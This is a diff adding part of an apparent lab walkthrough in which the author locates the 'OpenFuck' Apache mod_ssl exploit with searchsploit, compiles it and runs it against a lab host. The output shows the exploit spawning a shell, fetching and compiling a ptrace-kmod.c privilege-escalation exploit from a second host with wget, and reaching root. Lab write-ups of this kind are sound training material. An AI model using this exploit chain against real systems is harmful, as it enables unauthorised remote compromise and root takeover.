@@ -172,3 +172,90 @@ Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)      
 ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+
+Got the POC. Try using each POC to exploit:
+
+```
+searchsploit -m unix/remote/47080.c
+```
+
+```     
+  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
+      URL: https://www.exploit-db.com/exploits/47080
+     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
+File Type: C source, ASCII text
+
+Copied to: /home/kali/47080.c
+```
+
+Now I'm finding the way to use it. After a few minutes, I get them. Thanks to https://github.com/exploit-inters/OpenFuck.
+
+```
+gcc -o exploit 47080.c -lcrypto
+./exploit 
+```
+
+```
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./exploit target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+```
+
+As result of Enumeration step, I know that this web server is running on Red Hat Linux. The command now is:
+
+```
+./exploi 0x6b 172.10.0.222 -c 40
+```
+
+```
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8070
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+xploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; -kmod.c; gcc -o e 
+--03:48:50--  http://172.10.1.9:8000/ptrace-kmod.c
+           => `ptrace-kmod.c.1'
+Connecting to 172.10.1.9:8000... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,737 [text/x-csrc]
+
+    0K ...                                                   100% @   3.56 MB/s
+
+03:48:50 (3.56 MB/s) - `ptrace-kmod.c.1' saved [3737/3737]
+
+/usr/bin/ld: cannot open output file exploit: Permission denied
+collect2: ld returned 1 exit status
+gcc: file path prefix `/usr/bin' never used
+whoami
+root
+
+
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+```
